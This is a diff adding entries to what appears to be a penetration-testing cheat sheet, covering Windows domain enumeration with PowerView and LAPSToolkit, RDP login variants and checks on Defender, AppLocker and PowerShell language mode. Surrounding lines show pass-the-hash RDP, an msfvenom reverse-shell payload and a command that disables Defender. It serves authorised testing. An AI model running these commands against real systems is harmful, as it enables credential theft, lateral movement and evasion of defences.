@@ -144,7 +144,17 @@ C:\> net accounts
 - PowerView
 
 ```
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
 PS C:\> Get-DomainPolicy
+```
+
+- LAPSToolkit
+
+```
+https://github.com/leoloobeek/lapstoolkit
+PS C:\> Find-LAPSDelegatedGroups
+PS C:\> Find-AdmPwdExtendedRights
+PS C:\> Get-LAPSComputers
 ```
 
 - FTP (port 21)
@@ -544,6 +554,7 @@ https://github.com/dbcli/mycli
 $ xfreerdp /v:<IP address>
 $ xfreerdp /v:<IP address> /u:Administrator
 $ xfreerdp /v:<IP address> /u:Administrator /d:<Domain>
+$ xfreerdp /v:<IP address> /u:Administrator@test.local
 $ xfreerdp /v:<IP address>  /u:Administrator /pth:<hash>
 $ freerdp /v:<IP address> /cert:ignore /u:Administrator /p:'<password>'
 $ rdesktop -u <username> -p <password> <IP address>
@@ -2497,7 +2508,20 @@ $ msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=<IP Address> LPORT=<Port
 - Disable Windows Defender
 
 ```
+PS C:\> Get-MpComputerStatus
 PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true	
+```
+
+- View AppLocker Policies
+
+```
+PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
+
+- View PowerShell Language Mode
+
+```
+PS C:\> $ExecutionContext.SessionState.LanguageMode
 ```
 
 #12. - Online Resources
